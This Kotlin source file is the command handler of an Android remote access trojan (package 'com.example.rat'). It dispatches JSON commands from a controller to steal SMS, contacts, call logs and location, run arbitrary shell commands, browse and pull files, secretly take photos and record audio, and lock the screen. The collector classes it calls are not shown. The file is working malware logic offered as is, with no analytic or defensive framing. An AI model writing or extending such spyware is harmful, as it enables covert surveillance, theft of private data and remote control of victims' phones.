package com.example.rat

import android.app.admin.DevicePolicyManager
import android.content.Context
import org.json.JSONObject

class CommandHandler(private val context: Context) {

    fun handle(command: JSONObject): JSONObject {
        val id = command.optString("id", "0")
        val action = command.optString("cmd")

        return try {
            val data: Any = when (action) {
                "ping"      -> "pong"
                "info"      -> DeviceInfo.get(context)
                "sms"       -> com.example.rat.collectors.SmsCollector.get(context, command.optInt("limit", 50))
                "contacts"  -> com.example.rat.collectors.ContactsCollector.get(context, command.optInt("limit", 200))
                "calllog"   -> com.example.rat.collectors.CallLogCollector.get(context, command.optInt("limit", 100))
                "location"  -> com.example.rat.collectors.LocationCollector.get(context)
                "shell"     -> com.example.rat.collectors.ShellExecutor.run(command.getString("arg"))
                "ls"        -> com.example.rat.collectors.FileBrowser.list(command.optString("path", "/sdcard"))
                "pull"      -> com.example.rat.collectors.FileBrowser.read(command.getString("path"))
                "camera"    -> com.example.rat.collectors.MediaCapture.photo(command.optString("facing", "back"))
                "mic"       -> com.example.rat.collectors.MediaCapture.audio(context, command.optInt("seconds", 10))
                "toast"     -> {
                    android.widget.Toast.makeText(context, command.optString("arg"), android.widget.Toast.LENGTH_LONG).show()
                    "shown"
                }
                "lock"      -> {
                    lockScreen()
                    "locked"
                }
                else -> throw IllegalArgumentException("unknown command: $action")
            }
            JSONObject().put("id", id).put("ok", true).put("data", data)
        } catch (e: Exception) {
            JSONObject().put("id", id).put("ok", false).put("error", e.toString())
        }
    }

    private fun lockScreen() {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        @Suppress("DEPRECATION")
        dpm.lockNow()
    }
}
